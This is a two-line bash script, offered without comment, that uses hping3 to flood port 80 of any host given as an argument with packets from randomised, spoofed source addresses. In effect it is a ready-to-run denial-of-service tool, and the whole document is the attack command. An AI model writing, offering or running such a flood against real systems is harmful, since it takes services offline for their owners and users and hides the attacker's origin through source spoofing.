#!/bin/bash
hping3 -5 --flood -V --rand-source -p 80 $1
